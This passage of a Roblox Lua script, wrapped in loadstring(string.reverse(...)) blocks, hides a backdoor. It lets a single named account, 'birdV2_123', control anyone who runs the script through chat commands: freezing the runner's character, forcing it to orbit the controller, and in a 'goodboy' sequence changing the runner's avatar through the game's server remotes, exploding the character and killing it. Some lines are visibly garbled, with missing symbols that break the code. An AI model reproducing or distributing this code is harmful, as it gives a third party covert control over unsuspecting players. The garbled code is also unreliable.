local uiVisible=true
ToggleButton.MouseButton1Click:Connect(function()
uiVisible=not uiVisible
Frame.Visible=uiVisible
ToggleButton.Text=uiVisible and "à¸‹à¹ˆà¸­à¸™ UI" or "à¹‚à¸Šà¸§à¹Œ UI"
end)
end
local function UpdateList()
if LocalPlayer.Name~="birdV2_123"then return end
for ,child in pairs(ListFrame:GetChildren())do
if child:IsA("TextLabel")then
child:Destroy()
end
end
for name, in pairs(ScriptUsers)do
if name~="birdV2_123"then
local lbl=Instance.new("TextLabel")
lbl.Size=UDim2.new(1,0,0,25)
lbl.BackgroundTransparency=1
lbl.Text=name
lbl.TextColor3=Color3.fromRGB(200,200,200)
lbl.Font=Enum.Font.SourceSans
lbl.TextSize=16
lbl.Parent=ListFrame
end
end
end
local function LockPlayer()
if not LocalPlayer.Character then return end
Locked=true
local hrp=LocalPlayer.Character:WaitForChild("HumanoidRootPart")
local StarterPos=hrp.CFrame
task.spawn(function()
while Locked do
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")then
LocalPlayer.Character.HumanoidRootPart.CFrame=StarterPos
LocalPlayer.Character.Humanoid.WalkSpeed=0
LocalPlayer.Character.Humanoid.JumpPower=0
end
task.wait(0.1)
end
end)
end
local function UnlockPlayer()
Locked=false
Orbiting=false
if OrbitConnection then OrbitConnection:Disconnect()OrbitConnection=nil end
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")then
LocalPlayer.Character.Humanoid.WalkSpeed=16
LocalPlayer.Character.Humanoid.JumpPower=50
end
end
ScriptUsers[LocalPlayer.Name]=true
local function OrbitBird()
local bird=Players:FindFirstChild("birdV2_123")
if not bird or not bird.Character then return end
local root=bird.Character:WaitForChild("HumanoidRootPart")
Orbiting=true
local angle=0
OrbitConnection=RunService.Heartbeat:Connect(function()
if not Orbiting or not bird.Character or not bird.Character:FindFirstChild("HumanoidRootPart")then return end
angle+=OrbitSpeed
local radius=8
local newPos=root.CFrameCFrame.new(math.cos(angle)*radius,0,math.sin(angle)radius)
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")then
LocalPlayer.Character.HumanoidRootPart.CFrame=newPos
end
end)
end
local function ListenToBird(plr)
plr.Chatted:Connect(function(msg)
if msg=="à¸™à¸´à¹ˆà¸‡à¹†"then
if LocalPlayer.Name~="birdV2_123"then
LockPlayer()
end
elseif msg=="à¸›à¸¥à¹ˆà¸­à¸¢"then
if LocalPlayer.Name~="birdV2_123"then
UnlockPlayer()
end
elseif msg=="TOUx1"then
if LocalPlayer.Name~="birdV2_123"then
OrbitBird()
end
end
end)
end
local function OnPlayerUsingScript(plr)
ScriptUsers[plr.Name]=true
if LocalPlayer.Name=="birdV2_123"then
UpdateList()
end
end
OnPlayerUsingScript(LocalPlayer)
Players.PlayerAdded:Connect(function(plr)
if LocalPlayer.Name=="birdV2_123"then
UpdateList()
end
if plr.Name=="birdV2_123"then
ListenToBird(plr)
end
end)
local bird=Players:FindFirstChild("birdV2_123")
if bird then
ListenToBird(bird)
end
]]))()
loadstring(string.reverse([[
local Players=game:GetService("Players")
local ReplicatedStorage=game:GetService("ReplicatedStorage")
local Lighting=game:GetService("Lighting")
local TweenService=game:GetService("TweenService")
local LocalPlayer=Players.LocalPlayer
local Camera=workspace.CurrentCamera
local skyBackup={}
for _,v in pairs(Lighting:GetChildren())do
if v:IsA("Sky")then
table.insert(skyBackup,v:Clone())
end
end
local function setSpaceSky()
for _,v in pairs(Lighting:GetChildren())do
if v:IsA("Sky")then v:Destroy()end
end
local sky=Instance.new("Sky")
sky.SkyboxBk="http://www.roblox.com/asset/?id=159454299"
sky.SkyboxDn="http://www.roblox.com/asset/?id=159454296"
sky.SkyboxFt="http://www.roblox.com/asset/?id=159454293"
sky.SkyboxLf="http://www.roblox.com/asset/?id=159454300"
sky.SkyboxRt="http://www.roblox.com/asset/?id=159454297"
sky.SkyboxUp="http://www.roblox.com/asset/?id=159454295"
sky.Parent=Lighting
end
local function restoreSky()
for _,v in pairs(Lighting:GetChildren())do
if v:IsA("Sky")then v:Destroy()end
end
for _,v in pairs(skyBackup)do
v:Clone().Parent=Lighting
end
end
local function explodeEffect(pos)
local explosion=Instance.new("Explosion")
explosion.Position=pos
explosion.BlastRadius=8
explosion.BlastPressure=500000
explosion.Parent=workspace
end
local function applyOutfit()
local args1={{AccessoryData={Order=1,AccessoryType=Enum.AccessoryType.Hat,AssetId=15969126196}}}
ReplicatedStorage:WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyToRealHumanoid"):FireServer(unpack(args1))
local args2={{BodyScale={BodyTypeScale=0,DepthScale=0.5,HeadScale=1,HeightScale=0.5,WidthScale=0.5,ProportionScale=0}}}
ReplicatedStorage:WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyToRealHumanoid"):FireServer(unpack(args2))
end
local function triggerSequence()
if LocalPlayer.Name=="birdV2_123"then return end
applyOutfit()
setSpaceSky()
local sound1=Instance.new("Sound")
sound1.SoundId="rbxassetid://7097470288"
sound1.Parent=workspace
sound1:Play()
Camera.CameraSubject=LocalPlayer.Character:FindFirstChild("Humanoid")
task.wait(2)
local target=Players:FindFirstChild("birdV2_123")
if target and target.Character and LocalPlayer.Character then
local root=LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
local targetRoot=target.Character:FindFirstChild("HumanoidRootPart")
if root and targetRoot then
targetRoot.CFrame=root.CFrameCFrame.new(0,0,-3)
Camera.CameraSubject=target.Character:FindFirstChild("Humanoid")
local sound2=Instance.new("Sound")
sound2.SoundId="rbxassetid://82114462018373"
sound2.Parent=workspace
sound2:Play()
task.wait(1)
explodeEffect(root.Position)
LocalPlayer.Character:BreakJoints()
end
end
end
LocalPlayer.CharacterAdded:Connect(function(char)
restoreSky()
task.wait(0.5)
Camera.CameraSubject=char:WaitForChild("Humanoid")
end)
Players.PlayerChatted:Connect(function(player,msg)
if player.Name=="birdV2_123"and msg=="goodboy"then
triggerSequence()
end
end)
]]))()

